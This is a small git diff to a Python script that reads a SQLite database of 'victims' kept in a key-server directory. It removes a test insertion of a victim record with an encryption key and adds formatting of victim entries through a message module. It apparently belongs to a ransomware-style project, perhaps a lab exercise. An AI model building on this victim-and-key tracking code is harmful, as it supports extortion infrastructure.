@@ -1,4 +1,5 @@
 import sqlite3
+import message
 from datetime import datetime
 
 DB_FILENAME = '../serveur_cles/data/victims.sqlite'
@@ -133,10 +134,8 @@ for i, history in enumerate(fake_histories):
 # commit the changes and close the connection
 
 
-
-
-# Call the function to insert victim information
-insert_victim_new("Windows", "ab12cd34", "C:\\", "mykey")
-
-
-print(list_victim())
+lv = list_victim()
+for ent in lv:
+    msg_builder = message.list_victim_resp(ent[0], ent[1], ent[3], ent[2], ent[4])
+    print(msg_builder)
+print(message.list_victim_end())
